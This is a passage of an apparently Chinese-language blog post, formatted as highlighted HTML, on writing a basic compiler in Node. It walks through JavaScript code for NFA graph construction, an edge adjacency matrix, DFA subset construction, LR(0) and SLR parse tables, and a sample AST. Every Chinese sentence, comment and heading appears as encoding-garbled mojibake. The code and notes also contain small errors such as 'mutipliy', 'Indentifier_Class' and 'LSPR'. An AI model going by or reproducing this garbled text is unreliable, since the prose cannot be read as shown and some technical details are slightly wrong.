class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(wrapped.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = tmp;<br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(wrapped.<span class="hljs-property">index</span>); <span class="hljs-comment">// è·å–é‚»æ¥è¡¨</span><br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span>) &#123;<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br>  <span class="hljs-title function_">connect</span>(cur, nodeStart);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+ä¿®é¥°ç¬¦</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">plus</span>(<span class="hljs-params">base: VertexNode</span>) &#123;<br>  <span class="hljs-comment">// åŸºäºoldæ–°å»ºèŠ‚ç‚¹</span><br>  <span class="hljs-keyword">let</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, base.<span class="hljs-property">edgeVal</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">const</span> res = nodeStart;<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">let</span> cur = base?.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">while</span> (cur) &#123;<br>    <span class="hljs-keyword">const</span> vertexNode = graph.<span class="hljs-title function_">getVertex</span>(cur?.<span class="hljs-property">index</span>);<br>    <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(tmp.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart = tmp;<br>    tmp.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>    graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br>    cur = vertexNode.<span class="hljs-property">firstEdge</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">mutipliy</span>(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ¯”è¾ƒå›°æ‰°çš„æ˜¯è¿™äº›èŠ‚ç‚¹çš„æ•°æ®ç»“æ„å¦‚ä½•å­˜å‚¨æ˜¯ä¸€ä»¶è¦è€ƒè™‘å‘¨åˆ°çš„äº‹ï¼šéœ€è¦èŠ‚ç‚¹idï¼Œç”±äºè‡ªåŠ¨æœºæ˜¯æœ‰å‘å›¾ï¼Œå¹¶ä¸”å¯èƒ½å¸¦ç¯ï¼Œå¹¶ä¸”èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ä¹‹é—´å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€æ¡è¾¹ï¼Œè€ƒè™‘äº†ä¸‹ï¼Œè¿˜æ˜¯ç”¨é‚»æ¥è¡¨å­˜å‚¨(ä¸»è¦æ˜¯ç¬¬ä¸€ç‰ˆçš„ä»£ç æ˜¯è¿™æ ·çš„ï¼Œå†åŠ ä¸Šå¦‚æœæ„Ÿè§‰èŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥å¯èƒ½åœ¨æŸäº›æƒ…å†µä¸‹æ¯”è¾ƒå°‘ï¼Œä¸´ç•ŒçŸ©é˜µæ¯”è¾ƒæµªè´¹å†…å­˜)ï¼ŒfirstEdgeæŒ‡å‘å…¶æ‰€æœ‰çš„ä¸´ç•Œè¾¹ï¼ŒedgeVal æ˜¯è¾¹ä¸Šçš„å€¼ï¼Œå¯¹äºè¯¥å›¾çš„æœç´¢ï¼Œä½¿ç”¨bfs+dfs+æ£€æµ‹ç¯ã€‚</p><p>ifå¯¹åº”çš„nfa: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104727865.png" class=""></p><p>[a-z][a-z0-9]* çš„nfaä¸º: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104740056.png" class=""></p><p>è”åˆåå°±å˜æˆäº†ä¸€ä¸ªå¤§çš„nfaï¼Œå¹¶åœ¨ç»ˆæ€èŠ‚ç‚¹ä¸Šæ”¾ç½®ä¸€äº›åŠ¨ä½œï¼š<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104921040.png" class=""></p><h3 id="æ„å»ºé‚»æ¥çŸ©é˜µ">æ„å»ºé‚»æ¥çŸ©é˜µï¼š</h3><p><code>lib =&gt; parser =&gt; nfa =&gt; build_edgeså‡½æ•°</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> edges = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_item</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>);<br>&#125;);<br>edges[èµ·å§‹ç‚¹][ç»ˆæ­¢ç‚¹] = [è¾¹é›†åˆ]ï¼Œå¦‚æœæ˜¯epsilonï¼Œåˆ™æ˜¯<span class="hljs-literal">null</span><br><span class="hljs-title function_">build_edges</span>() dfs + bfs + é›†åˆå»é‡<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],   ======&gt; <span class="hljs-number">0</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, i, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">1</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, f, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">2</span><br>[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">3</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">4</span><br>    [<br>       a,  b,  c, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>,<br>      <span class="hljs-number">103</span>, <span class="hljs-number">104</span>, <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>,<br>      <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">114</span>,<br>      <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z<br>    ],<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">5</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">6</span><br>    [<br>       a,  b,  c, d, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>, <span class="hljs-number">103</span>, <span class="hljs-number">104</span>,<br>      <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>,<br>      <span class="hljs-number">113</span>, <span class="hljs-number">114</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z,  <span class="hljs-number">0</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,<br>       <span class="hljs-number">6</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">9</span><br>    ],<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">7</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">8</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">9</span><br>]<br></code></pre></td></tr></table></figure><p>å¯ä»¥éªŒè¯ä¸‹å°±æ˜¯å¦‚ä¸‹èŠ‚ç‚¹è¾¹å€¼å¯¹(è¡Œç´¢å¼•å¯¹åº”sourceèŠ‚ç‚¹ï¼Œåˆ—ç´¢å¼•å¯¹åº”targetèŠ‚ç‚¹ï¼ŒçŸ©é˜µå€¼å°±æ˜¯è¾¹é›†åˆ)ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">2</span>: i<br><br><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">4</span>: null<br><br><span class="hljs-symbol">2 </span>=&gt; <span class="hljs-number">3</span>: f<br><br><span class="hljs-number">4</span>=&gt;<span class="hljs-number">5</span>: [a-z]<br><br><span class="hljs-number">5</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">6</span>=&gt;<span class="hljs-number">7</span>: [a-z] [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]<br><br><span class="hljs-number">7</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">8</span>=&gt;<span class="hljs-number">6</span>: null<br></code></pre></td></tr></table></figure><h3 id="æ ¹æ®é‚»æ¥çŸ©é˜µæ„å»ºdfa">æ ¹æ®é‚»æ¥çŸ©é˜µæ„å»ºdfa</h3><p><span class="math display">\[Closure(S):Sçš„å¯è¾¾é—­åŒ…ï¼Œè¡¨ç¤ºä»é›†åˆSå‡ºå‘ï¼Œæ— éœ€æ¥å—ä»»ä½•å­—ç¬¦ï¼Œå³åªé€šè¿‡epsilonè¾¹å³å¯åˆ°è¾¾çš„çŠ¶æ€ç»„æˆçš„é›†åˆ\\Closure(S) = S \cup(\bigcup_{m\in{S}}edge(m, \epsilon))ï¼Œå…¶ä¸­edge(m, \epsilon)\\è¡¨ç¤ºä»çŠ¶æ€må‡ºå‘æ²¿ç€è¾¹cå¯åˆ°è¾¾çš„æ‰€æœ‰NFAçŠ¶æ€çš„é›†åˆ\]</span></p><p><span class="math display">\[å‡è®¾çŠ¶é›†åˆæœ‰å¦‚ä¸‹å‡ ä¸ªçŠ¶æ€ï¼šS=\{m, n, k\} \\ä»Sçš„çŠ¶æ€å‡ºå‘ï¼Œæ²¿ç€æŸæ¡è¾¹cå¯åˆ°è¾¾çš„æ–°çš„çŠ¶æ€é›†åˆï¼Œè¡¨ç¤ºä¸ºDFAedge(S, c) \\DFAedge(S, c) = Closure(\bigcup_{k\in{S}}edge(k, c))\]</span></p><p>æœ‰äº†Closureå’ŒDFAedgeç®—æ³•å•å…ƒï¼Œè¿™æ ·ä»NFAçš„èµ·ç‚¹å‡ºå‘ï¼Œä¸æ–­çš„æ›´æ–°DFAedge(S,c)ï¼Œæ¯æ¬¡æ–°ç”Ÿæˆçš„DFAedge(S,c)ï¼Œå³å¾—åˆ°DFAé‡Œçš„çŠ¶æ€èŠ‚ç‚¹ï¼Œæ®æ­¤å¾—åˆ°dfaçŠ¶æ€è½¬ç§»è¡¨</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">states<span class="hljs-selector-attr">[0]</span> &lt;- <span class="hljs-selector-attr">[]</span> <br>states<span class="hljs-selector-attr">[1]</span> &lt;- <span class="hljs-built_in">Closure</span>(<span class="hljs-selector-attr">[S]</span>)<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-number">1</span>, j &lt;- <span class="hljs-number">0</span> <br>while j &lt;= <span class="hljs-selector-tag">p</span> <br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> å­—æ¯é›† <br>e &lt;- <span class="hljs-built_in">DFAedge</span>(states<span class="hljs-selector-attr">[j]</span>, c) <br><span class="hljs-keyword">if</span> e == states<span class="hljs-selector-attr">[i]</span> <span class="hljs-keyword">for</span> some <span class="hljs-selector-tag">i</span> &lt;= <span class="hljs-selector-tag">p</span> <br>then trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">i</span><br><span class="hljs-keyword">else</span> <br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-number">1</span><br>states<span class="hljs-selector-attr">[p]</span> &lt;- e<br>trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">p</span><br>j &lt;- j + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ„å»ºå®Œæ­£åˆ™è¡¨è¾¾å¼ä¹‹åå°±å¯ä»¥å¯¹æˆ‘ä»¬çš„è¾“å…¥å¤„ç†æˆtokenæµäº†ã€‚(<code>lib =&gt; scanå‡½æ•°</code>)</p><h2 id="æ„å»ºæŠ½è±¡è¯­æ³•æ ‘">æ„å»ºæŠ½è±¡è¯­æ³•æ ‘</h2><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ç®€å•çš„LR(0)ä¸Šä¸‹æ— å…³æ–‡æ³•ï¼Œå…³äºä»€ä¹ˆæ˜¯ä¸Šä¸‹æ— å…³æ–‡ä»€ä¹ˆæ˜¯æœ‰å…³æ–‡ï¼Œè¯·æˆ³-&gt;,</p><p>ç†è®ºä¸Šä¸Šä¸‹æ— å…³æ–‡æ³•æ‰€ä»£è¡¨çš„æ–‡æ³•èŒƒå›´ï¼š LR(1) &gt; LSPR &gt; SLR &gt;LR(0) <strong>LR(0):</strong> æ²¡æœ‰æå‰é¢„æµ‹çš„ç¬¦å·ï¼Œå®¹æ˜“å‡ºç° shift-reduceå†²çªä»¥åŠ reduce-reduce å†²çªï¼Œæ‰€ä»¥éœ€è¦è®¾è®¡é€‚åˆçš„æ–‡æ³•ï¼›<strong>SLR:</strong> æœ‰ç®€å•çš„é¢„æµ‹ï¼Œå¯ä»¥ç”¨followé›†è§£å†³éƒ¨åˆ†shift-reduceå†²çªï¼Œä½†æ˜¯åœ¨æœ‰äº›æƒ…å†µä¸‹è¿˜æ˜¯ shift-reduceå†²çª <strong>LR(1):</strong>å¯ä»¥è§£å†³ shift-reduce å†²çªï¼Œä¹Ÿè§£å†³ reduce-reduce å†²çª<strong>LSPR:</strong> ç”±äº LR(1)çš„è¡¨ç‰¹åˆ«å¤§ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåšäº†ä¼˜åŒ–</p><p>çœ‹å¦‚ä¸‹æ–‡æ³•çš„ LR(0)ç”Ÿæˆè¿‡ç¨‹ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">E-&gt; Program $<br>P<span class="hljs-function"><span class="hljs-title">rogram</span> -&gt;</span> Assign == Assign<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Assign + Token<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Token<br>T<span class="hljs-function"><span class="hljs-title">oken</span> -&gt;</span> id<br></code></pre></td></tr></table></figure><p>LR(0)dfa</p><p><img src="../é£ä¹¦20230430-125517.jpg" /></p><p>LR(0)å¯¹åº”çš„çŠ¶æ€è½¬ç§»è¡¨ï¼š <img src="../é£ä¹¦20230430-124728.jpg" /></p><p>å¯ä»¥çœ‹åˆ°åœ¨çŠ¶æ€ 9 æ˜¯å­˜åœ¨ç§»ä½-è§„çº¦å†²çªçš„ï¼Œè¿™æ˜¯å› ä¸ºLR(0)é»˜è®¤åœ¨æ‰€æœ‰çš„ç»ˆç»“ç¬¦å·å¤„åšè§„çº¦ã€‚</p><p>slr è¯­æ³•æ˜¯æ¯”LR(0),æ›´ä¸ºå¹¿æ³›çš„ä¸€ç§è¯­æ³•ï¼Œå®ƒåªåœ¨ç‰¹å®šçš„åœ°æ–¹æ”¾ç½®è§„çº¦åŠ¨ä½œã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­é‡Œï¼Œåœ¨çŠ¶æ€9 å¤„ï¼Œåªæœ‰è§„çº¦å¼ 1 çš„ç§»ä½æŒ‡é’ˆåˆ°è¾¾é‡Œæœ«å°¾ï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä¸‹è§„çº¦å¼ 1åé¢å¯èƒ½ä¼šç´§æ¥ç€ä»€ä¹ˆç¬¦å·ï¼Œä¹Ÿå°±æ˜¯ followSet(Program) ={$}ï¼Œæ‰€ä»¥åªåœ¨$å¤„æ”¾ç½®è§„çº¦åŠ¨ä½œã€‚ ä¸‹é¢æ˜¯ slr åˆ†æè¡¨ï¼š <imgsrc="../é£ä¹¦20230430-163301.jpg" /></p><h2 id="äº”astç”Ÿæˆ">äº”ã€ASTç”Ÿæˆ</h2><p>ç”Ÿæˆå¥½åˆ†æè¡¨ä¹‹åï¼Œå°±å¯ä»¥æ ¹æ®åˆ†æè¡¨è¿›è¡Œè¯­æ³•åˆ†æäº†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨æå‰å®šä¹‰å¥½çš„æ–‡æ³•äº§ç”Ÿå¼åšå¯¹åº”çš„è§„çº¦åŠ¨ä½œï¼Œå¦‚ä¸‹case0å°±æ˜¯<code>Formals -&gt; int,TOKEN.ID</code>ï¼Œåœ¨è¿™é‡Œåˆ©ç”¨æ ˆå†…çš„å…ƒç´ ç”ŸæˆFormal_Classï¼›å°±è¿™æ ·æ¯æ¬¡åœ¨å¯¹åº”çš„æ–‡æ³•äº§ç”Ÿå¼ä¸Šå¯¹å¯¹åº”çš„åšè§„çº¦åŠ¨ä½œï¼Œä»è€Œå®Œæˆè‡ªåº•å‘ä¸Šçš„astçš„æ„å»º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><p>ä¸‹å›¾ç®€å•æ¨¡æ‹Ÿäº†<code>int ID (int ID)</code>çš„tokenæµå¤„ç†è¿‡ç¨‹ï¼Œ<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/stack.gif" class="" title="è¿™æ˜¯ä¸€å¼ å›¾ç‰‡">åœ¨æ²¡æœ‰è§„çº¦åŠ¨ä½œçš„æ—¶å€™tokenä¸€ç›´pushè¿›æ ˆï¼Œç›´åˆ°æœ‰å¯¹åº”çš„è§„çº¦åŠ¨ä½œï¼Œè¿™ä¸ªæ—¶å€™æŒ‰ç…§æŒ‡å®šçš„è§„çº¦åŠ¨ä½œï¼Œç”Ÿæˆéç»ˆç»“ç¬¦ï¼Œå†æŠŠè¯¥éç»ˆç»“ç¬¦æ”¾å…¥æ ˆå†…ï¼Œé‡å¤è¿›è¡Œï¼Œç›´åˆ°æ ˆå†…ä¸ºç©ºæˆ–è€…é‡åˆ°äº†$ï¼Œå½“ç„¶ï¼Œå¦‚æœåœ¨è¿™è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸åˆæ³•çš„å­—ç¬¦ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>ä»¥åŠç”Ÿæˆçš„ç®€å•astå¦‚ä¸‹ï¼š <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Program</span>_Class &#123;<br>  <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>    <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>    <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Branch</span>_Class &#123;<br>      <span class="hljs-attr">ifCond</span>: <span class="hljs-title class_">Cond</span>_Class &#123;<br>        <span class="hljs-attr">lExpr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>        <span class="hljs-attr">rExpr</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;0&#x27;</span> &#125;,<br>        <span class="hljs-attr">op</span>: <span class="hljs-string">&#x27;==&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">statementTrue</span>: <span class="hljs-title class_">Return</span>_Class &#123; <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125; &#125;,<br>      <span class="hljs-attr">statementFalse</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;m&#x27;</span>,<br>        <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>          <span class="hljs-attr">params_list</span>: [ <span class="hljs-literal">undefined</span> ],<br>          <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>          <span class="hljs-attr">params</span>: <span class="hljs-title 